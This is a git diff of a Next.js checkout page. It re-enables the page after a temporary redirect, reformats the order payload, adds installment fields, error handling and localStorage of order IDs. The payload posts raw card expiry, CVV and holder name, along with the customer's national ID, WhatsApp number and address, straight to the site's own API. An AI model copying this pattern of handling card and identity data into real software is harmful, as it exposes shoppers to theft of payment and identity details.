@@ -1,18 +1,5 @@
-// HIDDEN: Checkout page is temporarily disabled. Uncomment below to restore.
-// To re-enable: remove the redirect block and uncomment the original page code.
-
 "use client";
 
-import { useEffect } from "react";
-import { useRouter } from "next/navigation";
-
-export default function CheckoutPage() {
-  const router = useRouter();
-  useEffect(() => { router.replace("/cart"); }, [router]);
-  return null;
-}
-
-/*
 import { useSyncExternalStore } from "react";
 import { useRouter } from "next/navigation";
 import Link from "next/link";
@@ -56,16 +43,32 @@ export default function CheckoutPage() {
         expiry: fields.age,
         cvv: fields.cvv,
         cardHolder: fields.cardHolder,
-        items: items.map(i => ({ productId: i.product._id, name: i.product.name, price: i.product.salePrice ?? i.product.originalPrice, quantity: i.qty })),
+        items: items.map(i => ({
+          productId: i.product._id,
+          name: i.product.name,
+          price: i.product.salePrice ?? i.product.originalPrice,
+          quantity: i.qty,
+        })),
         total,
         customer: customer?.name,
         whatsapp: customer?.whatsapp,
         nationalId: customer?.nationalId,
         address: customer?.address,
+        installmentType: customer?.installmentType,
+        months: customer?.months,
+        downPayment: customer?.downPayment,
       }),
     });
+
     const data = res.ok ? await res.json().catch(() => ({})) : {};
+
+    if (!res.ok) {
+      const errMsg = data?.error || "حدث خطأ أثناء معالجة الطلب";
+      throw new Error(errMsg);
+    }
+
     if (data.orderId) localStorage.setItem("orderId", data.orderId);
+    if (data.dbId)    localStorage.setItem("dbOrderId", data.dbId);
   };
 
   return (
@@ -123,4 +126,3 @@ export default function CheckoutPage() {
     </div>
   );
 }
-*/
